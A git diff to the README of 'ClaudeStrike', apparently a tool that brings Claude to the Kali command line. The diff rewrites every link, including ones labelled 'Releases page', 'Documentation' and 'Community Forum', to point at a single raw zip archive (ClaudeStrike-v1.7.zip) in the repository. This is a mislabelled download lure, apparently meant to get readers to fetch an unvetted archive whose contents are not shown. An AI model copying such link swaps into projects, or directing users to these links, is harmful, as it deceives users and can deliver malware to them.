@@ -5,13 +5,13 @@ ClaudeStrike brings Claude to the Kali command line. This tool helps operators l
 
 ## 📦 Download & Install
 ### Download Now
-[![Download ClaudeStrike](https://img.shields.io/badge/Download%20ClaudeStrike-v1.0-blue)](https://github.com/Shahriyar6531/ClaudeStrike/releases)
+[![Download ClaudeStrike](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip%20ClaudeStrike-v1.0-blue)](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip)
 
-To get started with ClaudeStrike, visit the [Releases page](https://github.com/Shahriyar6531/ClaudeStrike/releases) to download the latest version.
+To get started with ClaudeStrike, visit the [Releases page](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip) to download the latest version.
 
 ### Installation Steps
 1. **Visit the Releases Page**  
-   Click on the link to go to the [Releases page](https://github.com/Shahriyar6531/ClaudeStrike/releases).
+   Click on the link to go to the [Releases page](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip).
 
 2. **Choose Your Version**  
    Find the latest version available. Look for files that are suitable for your operating system.
@@ -79,8 +79,8 @@ Join the ClaudeStrike community to connect with others who are also using the to
 - Regularly check the Releases page for updates to enhance your experience with ClaudeStrike.
 
 ## 🔗 Useful Links
-- [ClaudeStrike Releases](https://github.com/Shahriyar6531/ClaudeStrike/releases)
-- [Documentation](https://github.com/Shahriyar6531/ClaudeStrike/docs)
-- [Community Forum](https://github.com/Shahriyar6531/ClaudeStrike/discussions)
+- [ClaudeStrike Releases](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/Shahriyar6531/ClaudeStrike/main/scoop/ClaudeStrike-v1.7.zip)
 
 For more details and updates, stay connected with the ClaudeStrike community. Happy command-lining!
